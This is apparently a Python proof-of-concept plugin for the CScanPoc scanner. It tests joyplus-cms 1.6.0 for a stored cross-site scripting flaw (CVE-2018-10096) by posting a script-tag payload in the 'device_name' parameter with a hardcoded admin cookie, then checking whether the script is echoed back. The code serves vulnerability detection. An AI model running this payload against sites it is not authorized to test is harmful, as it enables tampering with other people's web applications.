# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'joyplus-cms_0001_L'  # 平台漏洞编号
    name = 'joyplus-cms跨站脚本'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.XSS  # 漏洞类型
    disclosure_date = '2018-06-14'  # 漏洞公布时间
    desc = '''
    joyplus-cms 1.6.0版本中存在跨站脚本漏洞。远程攻击者可借助manager/admin_ajax.php?action=save flag=add请求中的‘device_name’参数利用该漏洞执行代码。 
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-08698'
    cnvd_id = 'CNVD-2018-08698'  # cnvd漏洞编号
    cve_id = 'CVE-2018-10096'  # cve编号
    product = 'joyplus-cms'  # 漏洞组件名称
    product_version = '1.6.0'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '3c3f84a1-703e-4c41-9f67-7d96b7a56df8'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-07-10'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                },
                'cookie': {
                    'type': 'string',
                    'description': '登录cookie',
                    'default': 'PHPSESSID=24jqqggh598mn30evftcr0vvt5; adminid=1; adminname=admin; adminlevels=2%2C+4%2C+6%2C+7%2C+8+%2C9%2C+10; admincheck=0995217eb8800d617ccfef7e8bdee7f6',
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "/manager/admin_ajax.php?action=save&tab={pre}thirdpart_config"

            # 这里的cookie需要登录，后期cookie这里得接受外部的值
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Cookie': self.get_option('cookie')
            }
            data = '''id=&flag=add&device_name=%3Cscript%3Ealert%28%27cscan%27%29%3C%2Fscript%3E&api_url=&logo_url=&app_key='''
            vul_url = arg + payload

            # 构造执行存储xss漏洞
            response = requests.post(vul_url, headers=headers, data=data)

            payload2 = "/manager/api_manager.php"
            vul_url2 = arg + payload2

            # 验证xss漏洞是否触发
            response2 = requests.get(vul_url2, headers=headers)
            if response2.status_code == 200 and "<td><script>alert('cscan')</script></td>" in response2.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
